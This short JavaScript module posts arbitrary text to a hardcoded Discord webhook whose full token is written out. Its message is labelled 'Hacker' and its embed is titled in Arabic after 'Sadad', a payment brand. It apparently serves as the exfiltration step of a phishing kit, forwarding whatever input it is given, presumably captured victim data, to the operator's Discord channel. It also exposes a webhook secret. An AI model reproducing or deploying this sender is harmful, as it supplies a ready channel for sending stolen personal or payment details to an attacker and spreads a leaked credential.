import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324710475241619587/xDXfMzSrlfzXwWJEMBB5vGQEdqe4AO2TV-naD4yMy538p5W_-EGaChD11TM7MinJ6M3q",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
